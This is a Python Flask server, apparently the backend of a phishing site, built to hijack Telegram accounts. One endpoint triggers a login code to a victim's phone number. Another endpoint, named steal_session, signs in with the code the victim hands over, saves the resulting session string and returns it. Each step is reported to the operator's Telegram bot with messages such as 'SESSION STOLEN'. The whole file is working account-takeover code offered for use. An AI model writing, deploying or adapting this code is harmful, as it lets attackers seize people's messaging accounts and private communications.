from flask import Flask, request, jsonify
import os
import requests
import asyncio
import json
import time
from datetime import datetime
from telethon.sync import TelegramClient
from telethon.sessions import StringSession

app = Flask(__name__)

# Configuration
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')
SESSION_STRING = os.environ.get('SESSION_STRING')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

# Persistent storage
OTP_STORAGE_FILE = 'otp_storage.json'

def load_otp_storage():
    try:
        if os.path.exists(OTP_STORAGE_FILE):
            with open(OTP_STORAGE_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_otp_storage(data):
    try:
        with open(OTP_STORAGE_FILE, 'w') as f:
            json.dump(data, f)
    except:
        pass

def send_to_bot(message):
    if not BOT_TOKEN or not CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
        requests.post(url, json=data, timeout=5)
        return True
    except:
        return False

@app.route('/send_code', methods=['POST'])
def send_code():
    phone = request.form.get('phone', '').strip()
    
    # Fix phone format
    phone = phone.replace('+6262', '+62').replace('+620', '+62')
    
    if not phone:
        return jsonify({'success': False, 'error': 'No phone provided'})
    
    async def run():
        try:
            client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
            await client.connect()
            result = await client.send_code_request(phone)
            
            # Save to persistent storage
            storage = load_otp_storage()
            storage[phone] = {
                'phone_code_hash': result.phone_code_hash,
                'timestamp': time.time(),
                'created_at': datetime.utcnow().isoformat()
            }
            save_otp_storage(storage)
            
            send_to_bot(f"📱 *OTP SENT*\nPhone: `{phone}`\nHash: `{result.phone_code_hash}`")
            
            return {
                'success': True, 
                'phone_code_hash': result.phone_code_hash,
                'timestamp': time.time()
            }
            
        except Exception as e:
            error_msg = f"Send code error: {str(e)}"
            send_to_bot(f"❌ OTP FAILED: `{error_msg}`")
            return {'success': False, 'error': error_msg}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    try:
        return jsonify(asyncio.run(run()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/steal_session', methods=['POST'])
def steal_session():
    phone = request.form.get('phone', '').strip()
    code = request.form.get('code', '').strip()
    provided_hash = request.form.get('phone_code_hash', '')
    
    # Fix phone format
    phone = phone.replace('+6262', '+62').replace('+620', '+62')
    
    if not all([phone, code]):
        return jsonify({'success': False, 'error': 'Missing phone or code'})
    
    async def run():
        try:
            # Get hash from storage
            storage = load_otp_storage()
            otp_data = storage.get(phone, {})
            
            if not otp_data:
                return {'success': False, 'error': 'No OTP request found'}
            
            # Check expiration (5 minutes)
            if time.time() - otp_data.get('timestamp', 0) > 300:
                return {'success': False, 'error': 'OTP code expired'}
            
            # Use hash from storage (more reliable than provided_hash)
            phone_code_hash = otp_data['phone_code_hash']
            
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            
            result = await client.sign_in(
                phone=phone, 
                code=code, 
                phone_code_hash=phone_code_hash
            )
            
            session_string = client.session.save()
            user = await client.get_me()
            
            # Save session to storage
            sessions_storage = load_otp_storage()
            sessions_storage[f"session_{phone}"] = {
                'session_string': session_string,
                'user_id': user.id,
                'first_name': user.first_name or 'Unknown',
                'last_login': datetime.utcnow().isoformat()
            }
            save_otp_storage(sessions_storage)
            
            # Cleanup OTP data
            if phone in storage:
                del storage[phone]
                save_otp_storage(storage)
            
            send_to_bot(f"✅ *SESSION STOLEN*\nPhone: `{phone}`\nUser: `{user.first_name}`")
            
            return {'success': True, 'session': session_string}
            
        except Exception as e:
            error_msg = f"Steal session error: {str(e)}"
            send_to_bot(f"❌ STEAL FAILED: `{error_msg}`")
            return {'success': False, 'error': error_msg}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    try:
        return jsonify(asyncio.run(run()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/debug_storage')
def debug_storage():
    storage = load_otp_storage()
    return jsonify({
        'storage_entries': len(storage),
        'storage_keys': list(storage.keys())
    })

@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'timestamp': time.time()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
